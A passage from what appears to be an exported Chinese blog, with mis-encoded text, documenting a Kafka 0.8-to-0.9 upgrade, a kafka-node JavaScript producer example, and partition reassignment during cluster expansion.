jollybi jollybi 35725063 Jun 20 20:11 kafka_2.10-0.9.0.1.tgzdrwxr-xr-x 12 jollybi jollybi 4096 Sep 25 16:41 zookeeper-3.4.5-rw-rw-r-- 1 jollybi jollybi 38307840 Jul 14 11:40 zookeeper-3.4.5.tar[jollybi@kafka1 tools]$ mkdir -p /data/tools/kafka_2.10-0.9.0.1/kafka-logs[jollybi@kafka1 tools]$ mkdir -p /data/tools/kafka_2.10-0.9.0.1/logs###ä¿®æ”¹é…ç½®ï¼š(1)[jollybi@kafka1 tools]$ vim kafka_2.10-0.9.0.1/config/zookeeper.propertiesç¬¬ä¸€æ­¥ä¿®æ”¹:# the directory where the snapshot is stored.dataDir=dataDir=/data/jollybi/tools/zookeeper-3.4.5/tmp# the port at which the clients will connectclientPort=2281# disable the per-ip limit on the number of connections since this is a non-production configmaxClientCnxns=0dataDir,clientPortçš„æ„ä¹‰ä¸éœ€è¦è¯´æ˜äº†ï¼Œå¯¹äºmaxClientCnxnsé€‰é¡¹ï¼Œå¦‚æœä¸è®¾ç½®æˆ–è€…è®¾ç½®ä¸º0ï¼Œåˆ™æ¯ä¸ªipè¿æ¥zookeeperæ—¶çš„è¿æ¥æ•°æ²¡æœ‰é™åˆ¶ã€‚éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œè®¾ç½®maxClientCnxnsçš„å€¼æ—¶éœ€è¦æŠŠkafka serverçš„è¿æ¥æ•°è€ƒè™‘è¿›å»ï¼Œå› ä¸ºå¯åŠ¨kafka serveræ—¶ï¼Œkafka serverä¹Ÿä¼šè¿æ¥zookeeperçš„ã€‚(2)[jollybi@kafka1 tools]$ vim kafka_2.10-0.9.0.1/config/consumer.propertieszookeeper.connect=10.155.90.153:2281,10.155.90.155:2281,10.155.90.138:2281å…¶ä»–å‚æ•°æ ¹æ®ä¸åŒé›†ç¾¤ç¯å¢ƒè°ƒæ•´(3)[jollybi@kafka1 tools]$ vim kafka_2.10-0.9.0.1/config/producer.properties (ä¿®æ”¹å†…ç½‘IP)metadata.broker.list=10.155.90.153:9292,10.155.90.155:9292,10.155.90.138:9292producer.type=synccompression.codec=noneserializer.class=kafka.serializer.DefaultEncoderå…¶ä»–å‚æ•°æ ¹æ®ä¸åŒé›†ç¾¤ç¯å¢ƒè°ƒæ•´(4) [jollybi@kafka1 config]$ cat server.properties | grep -Pv \"^#|^$\"broker.id=1auto.leader.rebalance.enable = truelisteners=PLAINTEXT://10.155.90.153:9292port=9292host.name=10.155.90.153zookeeper.connect=10.155.90.153:2281,10.155.90.155:2281,10.155.90.138:2281zookeeper.connection.timeout.ms=6000num.network.threads=3num.io.threads=8socket.send.buffer.bytes=102400socket.receive.buffer.bytes=102400socket.request.max.bytes=104857600log.dirs=/data/tools/kafka_2.10-0.9.0.1/kafka-logslog.cleaner.enable=truedelete.topic.enable=truenum.partitions=1num.recovery.threads.per.data.dir=1log.retention.hours=96log.segment.bytes=1073741824log.retention.check.interval.ms=300000å¤‡æ³¨ï¼šlistenersä¸€å®šè¦é…ç½®æˆä¸ºIPåœ°å€ï¼›å¦‚æœé…ç½®ä¸ºlocalhostæˆ–æœåŠ¡å™¨çš„hostname,åœ¨ä½¿ç”¨javaå‘é€æ•°æ®æ—¶å°±ä¼šæŠ›å‡ºå¼‚ å¸¸ï¼šorg.apache.kafka.common.errors.TimeoutException: Batch Expired ã€‚å› ä¸ºåœ¨æ²¡æœ‰é…ç½®advertised.host.name çš„æƒ…å†µä¸‹ï¼ŒKafkaå¹¶æ²¡æœ‰åƒå®˜æ–¹æ–‡æ¡£å®£ç§°çš„é‚£æ ·æ”¹ä¸ºå¹¿æ’­æˆ‘ä»¬é…ç½®çš„hostnameï¼Œè€Œæ˜¯å¹¿æ’­äº†ä¸»æœºé…ç½®çš„hostnameã€‚è¿œç«¯çš„å®¢æˆ·ç«¯å¹¶æ²¡æœ‰é…ç½® hostsï¼Œæ‰€ä»¥è‡ªç„¶æ˜¯è¿æ¥ä¸ä¸Šè¿™ä¸ªhostnameçš„ kafkaä¸zkå†…å­˜æ—¥å¿—ä¼˜åŒ–æˆ‘ä¸ªäººåšå®¢æœ‰å†™ä¼˜åŒ–æ–‡æ¡£Bigdata-Zookeeperé›†ç¾¤æ—¥å¿—é…ç½®è¯¦è§£å’Œæ¸…ç†è‡ªå®šä¹‰å¯åŠ¨å†…å­˜Kafkaæ€§èƒ½ä¼˜åŒ–â€“JVMå‚æ•°é…ç½®ä¼˜åŒ–Kafkaæ—¥å¿—å­˜å‚¨è§£æä¸å®è·µæ•°æ®å­˜å‚¨ä¼˜åŒ– å‡çº§æ­¥éª¤æ–¹æ¡ˆï¼š1234567891011121314151617(0) mongodb èƒ½å­˜å‚¨æ—¶é—´æˆ³4ä¸ªå°æ—¶çš„æ•°æ®ï¼Œåœ¨4ä¸ªå°æ—¶ä¹‹å†…å‡çº§ä¸ä¼šæœ‰é£é™©ã€‚(1) mongotail å…ˆåœæ­¢ç”Ÿäº§å†™å…¥æ•°æ®åˆ°kafka(2) kafka æ¶ˆè´¹ç»„ç»§ç»­æ¶ˆè´¹ topicåˆ†åŒºæŸ¥çœ‹æ¶ˆè´¹ä¸ºé›¶ã€‚(3) zkéœ€è¦å‡çº§3.4.6ç‰ˆæœ¬å¯¹åº”kafka0.9.1ç‰ˆæœ¬ï¼Œå¦‚æœzkä¸éœ€è¦å‡çº§ï¼Œå‡çº§ä¹‹å‰è¦å…ˆå°†ZooKeeperä¸­åŸç‰ˆæœ¬çš„kafkaç”Ÿæˆçš„znodeåˆ é™¤ï¼ŒåŒ…æ‹¬ï¼šconsumers, controller, brokers, controller_epochç­‰ã€‚å¦åˆ™å¯åŠ¨kafkaä¼šæŠ¥é”™ã€‚(4) é‡å¯æ–°ç‰ˆæœ¬zké›†ç¾¤ï¼ŒæŸ¥çœ‹é›†ç¾¤æœåŠ¡é€‰ä¸¾æ˜¯å¦æ­£å¸¸ã€‚(5) é‡å¯æ–°ç‰ˆæœ¬kafkaé›†ç¾¤ï¼Œé‡å¯æ²¡æœ‰æŠ¥é”™ï¼ŒæŸ¥çœ‹ç‰ˆæœ¬æ²¡é—®é¢˜å°±è¡Œã€‚(6) zkä¸Šé¢æŸ¥çœ‹å‘½ä»¤ ./zkCli.sh -server 10.155.90.153:2281,10.155.90.155:2281,10.155.90.138:2281[zk: 10.155.90.153:2281,10.155.90.155:2281,10.155.90.138:2281(CONNECTED) 0] ls /controller_epoch controller brokers zookeeper kafka-manager admin isr_change_notification consumers config[zk: 10.155.90.153:2281,10.155.90.155:2281,10.155.90.138:2281(CONNECTED) 0] ls /brokers/ids[1, 2, 3] é›†ç¾¤ä¸‰ä¸ªbrokers idæ­£å¸¸(7)ä¿®æ”¹ç›‘æ§æŒ‡æ ‡ã€‚ å®Œæˆå‡çº§(8) å¦å¤–ï¼Œæ–°ç‰ˆæœ¬çš„ä¸€äº›å‘½ä»¤ä¸åŸç‰ˆæœ¬çš„æœ‰äº›ç›¸åŒ,å¢åˆ æ”¹æŸ¥å‘½ä»¤ã€‚ å¼€å§‹å‡çº§æ­¥éª¤æ“ä½œï¼š123456789101112131415161718192021222324252627282930313233343536373839404142434445ï¼ˆ1)å¯åŠ¨zkä¸kafka# /data/tools/zookeeper-3.4.6/bin/zkServer.sh start# /data/tools/kafka_2.10-0.9.0.1/bin/kafka-server-start.sh /data/tools/ kafka_2.10-0.9.0.1/config/server.properties &amp;ï¼ˆ2ï¼‰æ–°å»ºtopic#./bin/kafka-topics.sh --create --zookeeper 10.155.90.153:2281,10.155.90.155:2281,10.155.90.138:2281 --replication-factor 3 --partitions 12 --topic mongotail_lz4_imp #./bin/kafka-topics.sh --create --zookeeper 10.155.90.153:2281,10.155.90.155:2281,10.155.90.138:2281 --replication-factor 3 --partitions 12 --topic mongotail_lz4(3) æŸ¥çœ‹é›†ç¾¤topicåˆ†åŒºæƒ…å†µ#./bin/kafka-topics.sh --describe --zookeeper 10.155.90.153:2281,10.155.90.155:2281,10.155.90.138:2281 --topic mongotail_lz4(4) æ›´æ–°æ‰€æœ‰å¼€æºç›‘æ§ï¼ˆKafkaOffsetMonitorï¼‰vim /home/jollybi/./monitor/monitor.sh#!/bin/bashjava -Xms512M -Xmx512M -Xss1024K -XX:PermSize=256m -XX:MaxPermSize=512m -cp KafkaOffsetMonitor-assembly-0.2.0_modify.jar com.quantifind.kafka.offsetapp.OffsetGetterWeb --zk 10.155.90.153:2281,10.155.90.155:2281,10.155.90.138:2281 --port 8086 --refresh 10.seconds --retain 7.days &gt;/tmp/stdout.log 2&gt;&amp;1 &amp;zkåœ°å€ä¿®æ”¹æˆå†…ç½‘åœ°å€ è¿™é‡Œçš„æ•°æ®å­˜å‚¨7å¤©ã€‚é‡å¯æœåŠ¡ï¼š./monitor/monitor.sh &amp;ï¼ˆ5ï¼‰æ›´æ–°å¼€æºç›‘æ§ï¼ˆkafka-managerï¼‰vim kafka-manager-1.3.3.8/conf/application.confkafka-manager.zkhosts=\"10.155.90.153:2281,10.155.90.155:2281,10.155.90.138:2281\"zkåœ°å€ä¿®æ”¹æˆå†…ç½‘åœ°å€.é‡å¯æœåŠ¡ï¼š./kafka-manager-1.3.3.8/bin/kafka-manager -Dconfig.file=kafka-manager-1.3.3.8/conf/application.conf -Dhttp.port=8080 &amp;ï¼ˆ6ï¼‰æ›´æ–°å¼€æºç›‘æ§ï¼ˆzabbixï¼‰è‡ªå·±å†™çš„ç›‘æ§è„šæœ¬[jollybi@kafka1 ~]$ /data/tools/kafka_2.10-0.9.0.1/bin/kafka-run-class.sh kafka.tools.ConsumerOffsetChecker --zookeepe 10.155.90.153:2281,10.155.90.155:2281,10.155.90.138:2281 --group group_ml --topic mongotail_lz4[2017-10-31 14:05:24,390] WARN WARNING: ConsumerOffsetChecker is deprecated and will be dropped in releases following 0.9.0. Use ConsumerGroupCommand instead. (kafka.tools.ConsumerOffsetChecker$)Group Topic Pid Offset logSize Lag Ownergroup_ml mongotail_lz4 0 1205186 1205257 71 group_ml_Graphsql-test.jollychic.com-1509421110787-1daec53a-0group_ml mongotail_lz4 1 1206860 1206915 55 group_ml_Graphsql-test.jollychic.com-1509421110787-1daec53a-0....è¿è¡Œä¼šå‡ºç°WARNè­¦å‘Šï¼Œ0.9ç‰ˆæœ¬æ›´æ–°è¿‡äº†ï¼Œæ³¨æ„ï¼šåœ¨0.9.0.0ï¼Œkafka.tools.ConsumerOffsetCheckerå·²ç»ä¸æ”¯æŒäº†ã€‚ä½ åº”è¯¥ä½¿ç”¨kafka.admin.ConsumerGroupCommand(æˆ–bin/kafka-consumer-groups.shè„šæœ¬)æ¥ç®¡ç†æ¶ˆè´¹è€…ç»„ï¼ŒåŒ…æ‹¬ç”¨æ–°æ¶ˆè´¹è€…APIåˆ›å»ºçš„æ¶ˆè´¹è€…ã€‚è¿™é‡Œä½¿ç”¨kafka.admin.ConsumerGroupCommand æç¤ºå‘½ä»¤ä¸å¯¹ï¼Œç°åœ¨åœ¨ç ”ç©¶ä½¿ç”¨ã€‚ ç›‘æ§è„šæœ¬ è¾“å‡ºä¼šæœ‰æç¤ºç›´æ¥è¿‡æ»¤æ‰å³å¯ã€‚function wlj_event_lag &#123;echo \"`sh /etc/zabbix/kafka_topic_monitor.sh 2&gt;/dev/null | sed -n '3p'`\"&#125; ğŸ‰ kafkaå‡çº§ï¼Œè°ƒé…å†…ç½‘è®¿é—®åœ°å€ï¼Œå†…å­˜ï¼Œæ—¥å¿—è¾“å‡ºç±»å‹è°ƒä¼˜ï¼Œç›‘æ§æ›´æ–°é…ç½®ã€‚ğŸ‰ å‚è€ƒå®˜ç½‘æ–‡æ¡£ Apache Kafka ä» 0.8.0, 0.8.1.X æˆ– 0.8.2.X å‡çº§åˆ° 0.9.0.0 Communicative learning:ğŸ§ Linux shell_ senior operation and maintenance faction: QQ group 459096184 circle (system operation and maintenance - application operation and maintenance - automation operation and maintenance - virtualization technology research, welcome to join)ğŸ§ BigData-Exchange School:QQ group 521621407 circles (big data Yun Wei) (Hadoop developer) (big data research enthusiasts) welcome to join Bidata have internal WeChat exchange group, learn from each other, join QQ group has links.","link":"/2017/11/04/Bigdata-hadoop/Kafka/KafKaä»0.8.2.1å‡çº§åˆ°0.9.0.1å˜åŒ–æ–¹æ¡ˆä¸æ­¥éª¤/"},{"title":"Bigdata-Kafka-nodeæ¨¡å—å®ç°è°ƒç”¨jså‘é€æ•°æ®","text":"mongodbå†™åˆ°kafka æŒ‡å®štopicæ¶ˆè´¹ã€‚ä¸ºäº†ä¿è¯æ•°æ®ç¨³å®šå¯é æ€§ã€‚é…åˆå¤§æ•°æ®åœ¨countly ä½¿ç”¨å¼€æºKafka-nodeæ˜¯ä¸€ä¸ªNode.jså®¢æˆ·ç«¯ å†™jsç¨‹åºè®©countlyä¸‰å°é›†ç¾¤åˆ†åˆ«æ•°æ®åˆ°kafka åšæ–°çš„topicä¸»é¢˜å¤‡ä»½ã€‚ 1npm install kafka-node è¿›å…¥kafka-nodeç›®å½•: vim kafka_test.js 123456789101112131415161718192021222324252627282930313233343536373839404142var kafka = require('kafka-node'),HighLevelProducer = kafka.HighLevelProducer, //Producer = kafka.Producer, client = new kafka.Client('169.44.62.139:2281,169.44.59.138:2281,169.44.62.137:2281'), //producer = new Producer(client);producer = new HighLevelProducer(client);console.log('è¿æ¥kafkaä¸­');var argv = &#123; topic: \"test1\"&#125;;var topic = argv.topic || 'test1';var p = argv.p || 0;var a = argv.a || 0;var producer = new HighLevelProducer(client, &#123; requireAcks: 1, partitionerType: 3&#125;);console.log(producer);producer.on('ready', function() &#123; var args = &#123; appid: '222-wx238c28839a133d0e', createTime: '222-ddd', toUserName: '222-wx238c28839a133d0e', fromUserName: '222-wx238c28839a133d0e' &#125;; producer.send([&#123; topic: topic, partition: p, messages: [JSON.stringify(args)], attributes: a &#125;], function(err, result) &#123; console.log(err || result); process.exit(); &#125;); console.log(args);&#125;); å®˜ç½‘åœ°å€ï¼šhttps://www.npmjs.com/package/kafka-node#install-kafkaäº¤æµå­¦ä¹ ï¼šğŸ§ Linux shell_é«˜çº§è¿ç»´æ´¾: 459096184 åœˆå­ (ç³»ç»Ÿè¿ç»´-åº”ç”¨è¿ç»´-è‡ªåŠ¨åŒ–è¿ç»´-è™šæ‹ŸåŒ–æŠ€æœ¯ç ”ç©¶æ¬¢è¿åŠ å…¥)ğŸ§ BigData-Exchange School : 521621407 åœˆå­ï¼ˆå¤§æ•°æ®è¿ç»´)ï¼ˆHadoopå¼€å‘äººå‘˜)ï¼ˆå¤§æ•°æ®ç ”ç©¶çˆ±å¥½è€…) æ¬¢è¿åŠ å…¥ ç›¸åº”Bidataæœ‰å†…éƒ¨å¾®ä¿¡äº¤æµç¾¤äº’ç›¸å­¦ä¹ ï¼ŒåŠ å…¥QQç¾¤æœ‰é“¾æ¥ã€‚","link":"/2017/08/01/Bigdata-hadoop/Kafka/Kafka-nodeæ¨¡å—å®ç°è°ƒç”¨jså‘é€æ•°æ®/"},{"title":"KafKaåŠ¨æ€æ‰©å®¹ç¾¤é›†-(Topic.partitionsè¿ç§»)","text":"kafkaçš„æ‰©å®¹éš¾ç‚¹ï¼š1ï¼‰ä¸»è¦åœ¨äºå¢åŠ æœºå™¨ä¹‹åï¼Œæ•°æ®éœ€è¦rebalanceåˆ°æ–°å¢çš„ç©ºé—²èŠ‚ç‚¹ï¼Œå³æŠŠpartitionsè¿ç§»åˆ°ç©ºé—²æœºå™¨ä¸Šã€‚kafkaæä¾›bin/kafka-reassign-partitions.shå·¥å…·ï¼Œå®Œæˆparttitionçš„è¿ç§»ã€‚ 2ï¼‰kafkaçš„é›†ç¾¤çš„æ•°æ®é‡åŠ å¤§ï¼Œæ•°æ®rebalanceçš„æ—¶é—´è¾ƒé•¿ã€‚è§£å†³åŠæ³•æ˜¯æŠŠlog.retention.hours=1è®¾ç½®ä¸€å°æ—¶ï¼ˆç”Ÿäº§å‚æ•°24å°æ—¶ï¼‰ã€‚ä¿®æ”¹å‚æ•°ä¹‹åï¼Œé‡å¯kakfaèŠ‚ç‚¹ï¼Œkafkaä¼šä¸»åŠ¨purge 1å°æ—¶ä¹‹å‰çš„logæ•°æ®ã€‚ä»¥ä¸‹æ˜¯kafka_0.8.1.1ç‰ˆæœ¬kafkkaé›†ç¾¤æ‰©å®¹æ“ä½œè®°å½•ï¼Œä»3å°ç‰©ç†æœºæ‰©å®¹åˆ°4å°ç‰©ç†ï¼Œpartitionæ•°é‡ç”±24ä¸ªå¢åŠ åˆ°28ä¸ªã€‚ å‚è€ƒï¼šhttp://kafka.apache.org/081/documentation.html#basic_ops_modify_topic kafkaçš„å¤åˆ¶å‰¯æœ¬ï¼šå°†æœåŠ¡å™¨æ·»åŠ åˆ°Kafkaé›†ç¾¤éå¸¸ç®€å•ï¼Œåªéœ€ä¸ºå…¶åˆ†é…å”¯ä¸€çš„ä»£ç†IDï¼Œç„¶ååœ¨æ–°æœåŠ¡å™¨ä¸Šå¯åŠ¨Kafkaã€‚ä½†æ˜¯ï¼Œè¿™äº›æ–°çš„æœåŠ¡å™¨ä¸ä¼šè‡ªåŠ¨åˆ†é…ä»»ä½•æ•°æ®åˆ†åŒºï¼Œé™¤éå°†åˆ†åŒºç§»åŠ¨åˆ°è¿™äº›åˆ†åŒºï¼Œå¦åˆ™ç›´åˆ°åˆ›å»ºæ–°ä¸»é¢˜æ—¶æ‰ä¼šæ‰§è¡Œä»»ä½•å·¥ä½œã€‚æ‰€ä»¥é€šå¸¸å½“ä½ å°†æœºå™¨æ·»åŠ åˆ°ä½ çš„ç¾¤é›†ä¸­æ—¶ï¼Œä½ ä¼šæƒ³æŠŠä¸€äº›ç°æœ‰çš„æ•°æ®è¿ç§»åˆ°è¿™äº›æœºå™¨ä¸Šã€‚æ•°æ®è¿ç§»è¿‡ç¨‹æ˜¯æ‰‹åŠ¨å¯åŠ¨çš„ï¼Œä½†æ˜¯å®Œå…¨è‡ªåŠ¨åŒ–ã€‚ä¸‹é¢ä»‹ç»çš„æ˜¯ï¼ŒKafkaä¼šå°†æ–°æœåŠ¡å™¨æ·»åŠ ä¸ºæ­£åœ¨è¿ç§»çš„åˆ†åŒºçš„è·Ÿéšè€…ï¼Œå¹¶å…è®¸å…¶å®Œå…¨å¤åˆ¶è¯¥åˆ†åŒºä¸­çš„ç°æœ‰æ•°æ®ã€‚å½“æ–°æœåŠ¡å™¨å®Œå…¨å¤åˆ¶äº†æ­¤åˆ†åŒºçš„å†…å®¹å¹¶åŠ å…¥äº†åŒæ­¥å‰¯æœ¬æ—¶ï¼Œå…¶ä¸­ä¸€ä¸ªç°æœ‰å‰¯æœ¬å°†åˆ é™¤å…¶åˆ†åŒºçš„æ•°æ®ã€‚ åˆ†åŒºé‡æ–°åˆ†é…å·¥å…·å¯ç”¨äºè·¨ä»£ç†ç§»åŠ¨åˆ†åŒºã€‚ç†æƒ³çš„åˆ†åŒºåˆ†å¸ƒå°†ç¡®ä¿æ‰€æœ‰ä»£ç†çš„æ•°æ®åŠ è½½å’Œåˆ†åŒºå¤§å°ã€‚åˆ†åŒºé‡æ–°åˆ†é…å·¥å…·ä¸å…·å¤‡è‡ªåŠ¨ç ”ç©¶Kafkaé›†ç¾¤ä¸­çš„æ•°æ®åˆ†å¸ƒå¹¶ç§»åŠ¨åˆ†åŒºä»¥å®ç°å‡åŒ€è´Ÿè½½åˆ†é…çš„åŠŸèƒ½ã€‚å› æ­¤ï¼Œç®¡ç†å‘˜å¿…é¡»æ‰¾å‡ºå“ªäº›ä¸»é¢˜æˆ–åˆ†åŒºåº”è¯¥ç§»åŠ¨ã€‚ åˆ†åŒºé‡æ–°åˆ†é…å·¥å…·å¯ä»¥è¿è¡Œåœ¨3ä¸ªäº’æ–¥çš„æ¨¡å¼ä¸­ï¼š 12345--ç”Ÿæˆï¼šåœ¨æ­¤æ¨¡å¼ä¸‹ï¼Œç»™å®šä¸»é¢˜åˆ—è¡¨å’Œç»çºªäººåˆ—è¡¨ï¼Œè¯¥å·¥å…·ä¼šç”Ÿæˆå€™é€‰é‡æ–°â€‹â€‹åˆ†é…ï¼Œä»¥å°†æŒ‡å®šä¸»é¢˜çš„æ‰€æœ‰åˆ†åŒºç§»è‡³æ–°ç»çºªäººã€‚æ­¤é€‰é¡¹ä»…æä¾›äº†ä¸€ç§ä¾¿æ·çš„æ–¹å¼ï¼Œå¯ä»¥æ ¹æ®ä¸»é¢˜å’Œç›®æ ‡ä»£ç†åˆ—è¡¨ç”Ÿæˆåˆ†åŒºé‡æ–°åˆ†é…è®¡åˆ’ã€‚--executeï¼šåœ¨æ­¤æ¨¡å¼ä¸‹ï¼Œè¯¥å·¥å…·æ ¹æ®ç”¨æˆ·æä¾›çš„é‡æ–°åˆ†é…è®¡åˆ’å¯åŠ¨åˆ†åŒºé‡æ–°åˆ†é…ã€‚ï¼ˆä½¿ç”¨--reassignment-json-fileé€‰é¡¹ï¼‰ã€‚è¿™å¯ä»¥æ˜¯ç”±ç®¡ç†å‘˜åˆ¶ä½œçš„è‡ªå®šä¹‰é‡æ–°åˆ†é…è®¡åˆ’ï¼Œä¹Ÿå¯ä»¥æ˜¯ä½¿ç”¨--generateé€‰é¡¹æä¾›çš„è‡ªå®šä¹‰é‡æ–°åˆ†é…è®¡åˆ’ã€‚--verifyï¼šåœ¨æ­¤æ¨¡å¼ä¸‹ï¼Œè¯¥å·¥å…·ä¼šéªŒè¯ä¸Šæ¬¡æ‰§è¡Œè¿‡ç¨‹ä¸­åˆ—å‡ºçš„æ‰€æœ‰åˆ†åŒºçš„é‡æ–°åˆ†é…çŠ¶æ€ã€‚çŠ¶æ€å¯ä»¥æ˜¯æˆåŠŸå®Œæˆï¼Œå¤±è´¥æˆ–æ­£åœ¨è¿›è¡Œ è‡ªåŠ¨å°†æ•°æ®è¿ç§»åˆ°æ–°æœºå™¨ åˆ†åŒºé‡æ–°åˆ†é…å·¥å…·å¯ç”¨äºå°†å½“å‰ä¸€ç»„ç»çºªäººçš„ä¸€äº›ä¸»é¢˜ç§»åˆ°æ–°å¢çš„ç»çºªäººã€‚è¿™åœ¨æ‰©å±•ç°æœ‰é›†ç¾¤æ—¶é€šå¸¸å¾ˆæœ‰ç”¨ï¼Œå› ä¸ºå°†æ•´ä¸ªä¸»é¢˜ç§»åŠ¨åˆ°æ–°çš„ä»£ç†é›†æ¯”ç§»åŠ¨ä¸€ä¸ªåˆ†åŒºæ›´å®¹æ˜“ã€‚ç”¨äºè¿™æ ·åšæ—¶ï¼Œç”¨æˆ·åº”è¯¥æä¾›åº”è¯¥ç§»åŠ¨åˆ°æ–°çš„ç»çºªäººé›†åˆå’Œæ–°çš„ç»çºªäººçš„ç›®æ ‡åˆ—è¡¨çš„ä¸»é¢˜åˆ—è¡¨ã€‚ç„¶åï¼Œè¯¥å·¥å…·åœ¨æ–°çš„ä»£ç†é›†åˆä¸Šå‡åŒ€åˆ†é…ç»™å®šä¸»é¢˜åˆ—è¡¨çš„æ‰€æœ‰åˆ†åŒºã€‚åœ¨æ­¤è¿‡ç¨‹ä¸­ï¼Œä¸»é¢˜çš„å¤åˆ¶å› å­ä¿æŒä¸å˜ã€‚æœ‰æ•ˆåœ°ï¼Œä¸»é¢˜è¾“å…¥åˆ—è¡¨çš„æ‰€æœ‰åˆ†åŒºå‰¯æœ¬éƒ½ä»æ—§çš„ä»£ç†é›†åˆç§»åŠ¨åˆ°æ–°æ·»åŠ çš„ä»£ç†ã€‚ä¾‹å¦‚ï¼Œä»¥ä¸‹ç¤ºä¾‹å°†æŠŠä¸»é¢˜countly_apppushï¼Œcountly_event...çš„æ‰€æœ‰åˆ†åŒºç§»åŠ¨åˆ°æ–°çš„ä»£ç†é›†4 ã€‚åœ¨æœ¬æ¬¡ç§»åŠ¨ç»“æŸæ—¶ï¼Œä¸»é¢˜countly_apppushï¼Œcountly_event...çš„æ‰€æœ‰åˆ†åŒºå°†ä»…å­˜åœ¨äºä»£ç†4ä¸Šã€‚ 1.kafka æ‰©å®¹é¦–å…ˆæŒ‰ç…§æ­å»ºæ­¥éª¤ï¼Œåœ¨å…¶ä»–æœºå™¨ä¸Šæ­å»ºé›†ç¾¤ï¼Œkafkaçš„é…ç½®æ–‡ä»¶ä¸­ zkconnect è¦ä¿æŒä¸åŸkafkaä¸€è‡´kafkaç‰ˆæœ¬ä¸€è‡´ï¼Œé…ç½®è·Ÿä¹‹å‰kafkaé›†ç¾¤ä¸€è‡´ï¼Œåªéœ€è¦ä¿®æ”¹æœ¬åœ°kafkaçš„åœ°å€. 2.éªŒè¯kafkaæ–°èŠ‚ç‚¹æ˜¯å¦åŠ å…¥é›†ç¾¤æˆåŠŸï¼Œè¿™ä¸ªåº”è¯¥å»zookeeperçš„zkCli.sh å»æŸ¥çœ‹123[root@kafka1 bin]# ./zkCli.sh -server 10.155.90.153:2281,10.155.90.155:2281,10.155.90.138:2281[zk: 10.155.90.153:2281,10.155.90.155:2281,10.155.90.138:2281(CONNECTED) 0] ls /brokers/ids/1,2,3,4 3.ç”±äºè¯¥å·¥å…·æ¥å—ä¸»é¢˜çš„è¾“å…¥åˆ—è¡¨ä½œä¸ºjsonæ–‡ä»¶ï¼Œå› æ­¤é¦–å…ˆéœ€è¦ç¡®å®šè¦ç§»åŠ¨çš„ä¸»é¢˜å¹¶åˆ›å»ºjsonæ–‡ä»¶ï¼Œå¦‚ä¸‹æ‰€ç¤ºï¼š1234567891011&#123;\"topics\": [&#123;\"topic\": \"countly_apppush\"&#125;, &#123;\"topic\": \"countly_event\"&#125;, &#123;\"topic\": \"countly_imp\"&#125;, &#123;\"topic\": \"countly_metrics\"&#125;, &#123;\"topic\": \"countly_pv\"&#125;, &#123;\"topic\": \"countly_session\"&#125;, &#123;\"topic\": \"mongotail_lz4\"&#125;, &#123;\"topic\": \"mongotail_lz4_imp\"&#125; ], \"version\":1&#125; 4.ä¸€æ—¦jsonæ–‡ä»¶å‡†å¤‡å°±ç»ªï¼Œä½¿ç”¨åˆ†åŒºé‡æ–°åˆ†é…å·¥å…·æ¥ç”Ÿæˆå€™é€‰åˆ†é…ï¼š12345678910111213bin/kafka-reassign-partitions.sh --zookeeper 10.155.90.153:2281,10.155.90.155:2281,10.155.90.138:2281 --topics-to-move-json-file topics-to-move.json --broker-list \"1,2,3,4\" --generate[jollybi@kafka3 kafka_2.10-0.9.0.1]$ bin/kafka-reassign-partitions.sh --zookeeper 10.155.90.153:2281,10.155.90.155:2281,10.155.90.138:2281 --topics-to-move-json-file topics-to-move.json --broker-list \"1,2,3,4\" --generateCurrent partition replica assignment&#123;\"version\":1,\"partitions\":[&#123;\"topic\":\"countly_metrics\",\"partition\":7,\"replicas\":[1,3,2]&#125;,&#123;\"topic\":\"countly_event\",\"partition\":6,\"replicas\":[1]&#125;,&#123;\"topic\":\"countly_pv\",\"partition\":8,\"replicas\":[3,2,1]&#125;,&#123;\"topic\":\"countly_pv\",\"partition\":0,\"replicas\":[1,3,2]&#125;,&#123;\"topic\":\"countly_imp\",\"partition\":5,\"replicas\":[1,3,2]&#125;,&#123;\"topic\":\"countly_imp\",\"partition\":8,\"replicas\":[1,2,3]&#125;,&#123;\"topic\":\"countly_apppush\",\"partition\":0,\"replicas\":[2,3,1]&#125;,&#123;\"topic\":\"countly_session\",\"partition\":8,\"replicas\":[1,3,2]&#125;,&#123;\"topic\":\"countly_imp\",\"partition\":9,\"replicas\":[2,1,3]&#125;,&#123;\"topic\":\"countly_metrics\",\"partition\":2,\"replicas\":[2,1,3]&#125;,&#123;\"topic\":\"countly_session\",\"partition\":4,\"replicas\":[3,1,2]&#125;,&#123;\"topic\":\"countly_pv\",\"partition\":4,\"replicas\":[2,3,1]&#125;,&#123;\"topic\":\"countly_apppush\",\"partition\":6,\"replicas\":[2,3,1]&#125;,&#123;\"topic\":\"countly_imp\",\"partition\":11,\"replicas\":[1,3,2]&#125;,&#123;\"topic\":\"countly_pv\",\"partition\":3,\"replicas\":[1,2,3]&#125;,&#123;\"topic\":\"countly_metrics\",\"partition\":4,\"replicas\":[1,2,3]&#125;,&#123;\"topic\":\"countly_metrics\",\"partition\":8,\"replicas\":[2,1,3]&#125;,&#123;\"topic\":\"countly_imp\",\"partition\":10,\"replicas\":[3,2,1]&#125;,.....Proposed partition reassignment configuration&#123;\"version\":1,\"partitions\":[&#123;\"topic\":\"countly_event\",\"partition\":6,\"replicas\":[3]&#125;,&#123;\"topic\":\"countly_metrics\",\"partition\":7,\"replicas\":[4,2,3]&#125;,&#123;\"topic\":\"countly_pv\",\"partition\":8,\"replicas\":[2,1,3]&#125;,&#123;\"topic\":\"countly_pv\",\"partition\":0,\"replicas\":[2,3,4]&#125;,&#123;\"topic\":\"countly_imp\",\"partition\":5,\"replicas\":[3,4,1]&#125;,&#123;\"topic\":\"countly_imp\",\"partition\":8,\"replicas\":[2,4,1]&#125;,&#123;\"topic\":\"countly_apppush\",\"partition\":0,\"replicas\":[1,2,3]&#125;,&#123;\"topic\":\"countly_imp\",\"partition\":9,\"replicas\":[3,1,2]&#125;,&#123;\"topic\":\"countly_session\",\"partition\":8,\"replicas\":[1,2,3]&#125;,&#123;\"topic\":\"countly_metrics\",\"partition\":2,\"replicas\":[3,4,1]&#125;,&#123;\"topic\":\"countly_session\",\"partition\":4,\"replicas\":[1,4,2]&#125;,&#123;\"topic\":\"countly_pv\",\"partition\":4,\"replicas\":[2,4,1]&#125;,&#123;\"topic\":\"countly_apppush\",\"partition\":6,\"replicas\":[3,1,2]&#125;,&#123;\"topic\":\"countly_imp\",\"partition\":11,\"replicas\":[1,3,4]&#125;,&#123;\"topic\":\"countly_pv\",\"partition\":3,\"replicas\":[1,2,3]&#125;...... å…¶ä¸­çš„Current partition replica 